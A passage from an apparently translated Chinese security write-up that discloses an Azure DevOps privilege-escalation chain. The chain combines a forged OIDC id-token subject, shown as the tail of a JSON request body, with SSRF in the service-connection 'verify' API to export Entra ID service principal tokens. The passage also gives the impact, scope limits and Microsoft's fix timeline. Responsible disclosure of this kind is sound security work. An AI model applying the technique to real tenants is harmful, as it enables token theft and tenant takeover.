"workloadIdentityFederationSubject": "anysubject",        "serviceprincipalid": "44c79819-1e17-461e-a59b-3c652f67862e"      },      "scheme": "WorkloadIdentityFederation"    }  }}
```  
  
结果就是，以下请求被发送到了我的应用服务：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5A9jDzicnIGgCCIuDPnXlczgJAVyrBGicflQiaa8aAX3V1N25xCrFBeiciaHNHiaW3yHNetNbQS0DCMEpiaGnVsja24gK8FPPyfFYRXM0/640?from=appmsg "null")  
  
  
事实上，有好几个端点可以用来获取针对不同后端资源的令牌。例如，下面是一张获取 Key Vault 令牌的截图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5AJlXHxEAcypaEsKGydZViav2Lqrchp9viaxHibozI8I1ESgLuicNJZDk9raZpf6msvDibj2e3G8ODnRBAsRDkr8f4RY5MKUJbacCPQ/640?from=appmsg "null")  
  
用一个简单的流程图来总结整个攻击原理：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5CbHTW82ACG4nwUM3sqFaRI1BCsmibMKhIibGbhEQc8baoqhoOag90bHmSolAbP8LOmlvzwUxH8SibREaRWEib2muPLSykVBLvt5ibo/640?from=appmsg "null")  
## 五、影响  
  
我们现在有两个可以串联起来以造成实际影响的漏洞。我们能够：  
1. 1. 强制 Azure DevOps 生成一个带有我们可控主题（subject）的已签名 id 令牌。  
  
1. 2. 强制 Azure DevOps 将该令牌兑换成代表 Entra ID 中某个服务主体的访问令牌，**且该服务主体是租户内任何使用了 Azure DevOps 服务连接配置联合凭证的服务主体**  
。  
  
1. 3. 通过 SSRF 漏洞，强制 Azure DevOps 将获取到的 Entra ID 服务主体的访问令牌发送给我们。  
  
最终结果是，组织中任何有权在 Azure DevOps 中创建服务连接的用户，都可以冒充 Entra ID 中任何使用了 DevOps 联合凭证的服务主体。在许多组织中，由于存在高权限的流水线（例如由平台团队运维的流水线），这可能导致 Entra ID 的完全沦陷。  
  
为了更直观地说明这一点，请参见下图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5Azl4BVGTicLLcayb3bfvZpHZRGHyfefPUjyiaGOAiakibUQHf8BwAbESwQZ2BvckNibRfHMlhT4DA7a5xEwa5NicL51iaDLUyRP12qUw/640?from=appmsg "null")  
### 影响范围的限制  
  
上文未讨论的一个细节是 OIDC 提供方本身。在测试期间，我们发现授权部分有一个参数 "workloadIdentityFederationIssuerType"，可以设置为 AzureAD 或 DevOps。在较老的组织中，此值默认为 DevOps，而在较新的组织中则默认为 AzureAD。这决定了令牌的 **颁发者（issuer）**  
 是谁。  
  
此漏洞仅影响那些历史足够长、以至于仍将 DevOps 颁发者作为默认颁发者的组织。这一变更似乎是在最近几年内发生的，因此，大多数深度依赖 DevOps 的组织仍然受到此漏洞的影响。  
## 六、总结  
  
总而言之——Azure DevOps 中有一个“验证”按钮，用于在保存服务连接之前检查它是否真的有权访问后端资源。这个按钮是通过一个 API 调用实现的，该调用可用于将许多经过身份验证的操作“代理”到后端 API。所支持的许多操作中都包含 SSRF 漏洞，其中一些可被滥用以从服务连接中导出访问令牌。除此之外，还有一个额外的错误，允许攻击者利用同一端点上错误实现的 OIDC 功能来提升权限。  
  
对于一个仅用于“验证身份验证”的按钮来说，这是一个巨大的实现缺陷，其影响也相当显著。事实上，在其他 CI/CD 提供方（如 Github Actions）中，他们并不费心去做这个——因为你可以通过检查日志来查看登录是否失败。  
  
这就引出了一个问题——这个功能为什么存在？  
  
这是 Web 应用程序中的一个经典问题：并非真正必要的功能暴露了巨大的攻击面，可能导致该 Web 应用被攻陷。真正的修复方法是弃用该 API，彻底移除这个攻击面。最终，这对 Azure DevOps 的实际功能不会有任何负面影响。  
  
然而，微软只是增加了一些保护措施并修复了那个一次性的主题（subject）伪造问题，但未能解决该端点中系统性的 SSRF 漏洞……  
## 七、向微软报告漏洞  
  
我将此漏洞作为三个不同的问题进行了报告：  
- • 伪造 id 令牌的 subject，导致权限提升并接管服务主体  
  
- • 机器学习（Machine Learning）数据源中的 SSRF 漏洞  
  
- • Key Vault 中的 SSRF 漏洞（与机器学习中的 SSRF 类型相同）  
  
大致时间线如下：  
- • 2025年8月5日：向微软报告。  
  
- • 微软将 Key Vault SSRF 漏洞的严重性设为低。  
  
- • 2025年9月10日：微软确认了 subject 伪造行为和权限提升问题。  
  
- • 2025年9月23日：微软发布了针对 subject 伪造问题的修复。  
  
- • 2025年10月1日：微软确认了 Key Vault SSRF 漏洞。  
  
- • 2025年10月21日：微软发布了针对 Key Vault SSRF 漏洞的修复。  
  
- • 对于导致访问令牌导出的机器学习 SSRF 漏洞，微软从未回应，但悄悄修复了它。  
  
微软总共为权限提升漏洞奖励了 5000 美元，但没有为 SSRF 漏洞提供任何奖金。理由是：  
> 虽然存在 SSRF 漏洞，但访问权限仅限于预定义的域名集合，且未发现除攻击者已有访问权限之外的任何权限提升。如果您能展示出导致实际权限提升的可行攻击，我们很乐意重新评估此问题的严重性。  
  
#### 引用链接  
  
[1]  
 《Azure DevOps Privilege Escalation via OIDC Abuse》: https://dazesecurity.io/blog/azureDevOpsPrivEsc  
[2]  
 OAuth 客户端凭证授权（OAuth Client Credential Grant）: https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-client-creds-grant-flow  
[3]  
 众所周知的公共 URL: https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfig  
[4]  
 “服务连接（Service Connection）”: https://learn.microsoft.com/en-us/azure/devops/pipelines/library/service-endpoints?view=azure-devops#common-service-connection-types  
[5]  
 本地研究人员: https://www.binarysecurity.no/posts/2025/05/finding-ssrfs-in-devops-part2  
  
   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Kric7mM9eA5D3bHb16xiaG7cZZia10Lk11HThCPU0PMdoY3OatNgjswVjlynNdkTk0vHGicZgEJlIztZvZhMkHvyPMm7gkL6mPwNYANl0nPsWQM/640?wx_fmt=gif&from=appmsg "")  
  
  
  
**交流群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5AMmMkcoIVvmbuTCGpYAxNhKdhwMuWElSp8ne8fp0M5fB9ncmfk6SlIQI9tNKulNLxOQl8w36M7te3UjKgfadwsQsL7ibKzIHg0/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
